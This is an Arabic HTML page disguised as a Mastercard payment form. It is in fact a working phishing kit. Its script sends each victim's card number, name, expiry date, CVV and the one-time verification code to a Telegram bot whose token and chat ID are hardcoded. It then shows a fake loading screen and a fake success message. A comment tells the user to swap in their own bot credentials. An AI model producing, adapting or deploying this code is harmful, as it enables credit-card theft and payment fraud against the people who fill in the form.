<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دفع بواسطة ماستركارد</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #0066cc;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .card-icons {
            text-align: center;
            margin: 15px 0;
        }
        .card-icons img {
            height: 30px;
            margin: 0 5px;
        }
        .btn {
            background-color: #0066cc;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #0055aa;
        }
        .cvv-info {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        
        /* نمط الشعارات المنبثقة */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }
        .modal-content {
            background-color: #fff;
            margin: 15% auto;
            padding: 20px;
            border-radius: 8px;
            width: 80%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .loading {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0066cc;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>دفع بواسطة ماستركارد</h1>
        
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
        </div>
        
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">رقم البطاقة</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>
            
            <div class="form-group">
                <label for="cardName">اسم حامل البطاقة</label>
                <input type="text" id="cardName" name="cardName" placeholder="كما هو مدون على البطاقة" required>
            </div>
            
            <div class="form-group">
                <label for="expiryDate">تاريخ الانتهاء</label>
                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
            </div>
            
            <div class="form-group">
                <label for="cvv">رمز التأكيد (CVV)</label>
                <input type="password" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
                <div class="cvv-info">الرمز المكون من 3 أو 4 أرقام الموجود على ظهر البطاقة</div>
            </div>
            
            <div class="form-group">
                <label for="amount">المبلغ (USD)</label>
                <input type="number" id="amount" name="amount" placeholder="0.00" step="0.01" min="0" required>
            </div>
            
            <div class="form-group">
                <button type="submit" class="btn">تأكيد الدفع</button>
            </div>
        </form>
    </div>

    <!-- شعار طلب كود التحقق -->
    <div id="verificationModal" class="modal">
        <div class="modal-content">
            <h3>التحقق من الدفع</h3>
            <p>الرجاء إدخال كود التحقق المرسل إليك</p>
            <input type="text" id="verificationCode" placeholder="أدخل الكود هنا" style="width: 80%; padding: 10px; margin: 10px 0;">
            <button id="submitCode" style="background-color: #0066cc; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer;">تأكيد</button>
        </div>
    </div>

    <!-- شعار التحميل -->
    <div id="loadingModal" class="modal">
        <div class="modal-content">
            <h3>جاري معالجة الدفع</h3>
            <div class="loading"></div>
            <p>الرجاء الانتظار...</p>
        </div>
    </div>

    <script>
        // إعدادات بوت التليجرام (استبدلها بمعلوماتك)
        const BOT_TOKEN = '7679204331:AAFkc5f5ojQZBmjpm_-6DRJvWcORzBZXNrg';
        const CHAT_ID = '7154036384';
        
        // دالة لإرسال الرسائل إلى التليجرام
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                const data = await response.json();
                console.log('تم الإرسال إلى التليجرام:', data);
                return data;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                throw error;
            }
        }
        
        // تنسيق رقم البطاقة
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '');
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
            }
            e.target.value = value;
        });

        // تنسيق تاريخ الانتهاء
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // عند الضغط على تأكيد الدفع
        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // جمع بيانات النموذج
            const formData = new FormData(this);
            const cardData = {
                cardNumber: formData.get('cardNumber'),
                cardName: formData.get('cardName'),
                expiryDate: formData.get('expiryDate'),
                cvv: formData.get('cvv'),
                amount: formData.get('amount')
            };
            
            // التحقق من صحة البيانات
            const cardNumber = cardData.cardNumber.replace(/\s/g, '');
            const cvv = cardData.cvv;
            
            if (cardNumber.length < 16 || isNaN(cardNumber)) {
                alert('الرجاء إدخال رقم بطاقة صحيح');
                return;
            }
            
            if (cvv.length < 3 || isNaN(cvv)) {
                alert('الرجاء إدخال رمز تأكيد صحيح');
                return;
            }
            
            // إرسال معلومات البطاقة إلى التليجرام
            try {
                await sendToTelegram(`بدأ عملية دفع جديدة:
- رقم البطاقة: ${cardData.cardNumber}
- اسم الحامل: ${cardData.cardName}
- تاريخ الانتهاء: ${cardData.expiryDate}
- CVV: ${cardData.cvv}
- المبلغ: ${cardData.amount} USD`);
                
                // عرض شعار طلب كود التحقق
                document.getElementById('verificationModal').style.display = 'block';
            } catch (error) {
                alert('حدث خطأ أثناء إرسال بيانات البطاقة');
            }
        });

        // عند الضغط على تأكيد كود التحقق
        document.getElementById('submitCode').addEventListener('click', async function() {
            const verificationCode = document.getElementById('verificationCode').value;
            
            if (!verificationCode) {
                alert('الرجاء إدخال كود التحقق');
                return;
            }
            
            // إرسال كود التحقق إلى التليجرام
            try {
                await sendToTelegram(`تم إدخال كود التحقق: ${verificationCode}`);
                
                // إغلاق شعار التحقق وفتح شعار التحميل
                document.getElementById('verificationModal').style.display = 'none';
                document.getElementById('loadingModal').style.display = 'block';
                
                // محاكاة عملية الدفع (3 ثواني)
                setTimeout(async function() {
                    try {
                        // إرسال تأكيد إتمام الدفع
                        await sendToTelegram('تمت عملية الدفع بنجاح!');
                        
                        // إغلاق شعار التحميل وإظهار رسالة نجاح
                        document.getElementById('loadingModal').style.display = 'none';
                        alert('تمت عملية الدفع بنجاح!');
                        document.getElementById('paymentForm').reset();
                    } catch (error) {
                        document.getElementById('loadingModal').style.display = 'none';
                        alert('حدث خطأ أثناء تأكيد الدفع');
                    }
                }, 3000);
            } catch (error) {
                alert('حدث خطأ أثناء إرسال كود التحقق');
            }
        });

        // إغلاق الشعارات عند النقر خارجها
        window.addEventListener('click', function(event) {
            if (event.target.className === 'modal') {
                event.target.style.display = 'none';
            }
        });
    </script>
</body>
</html>
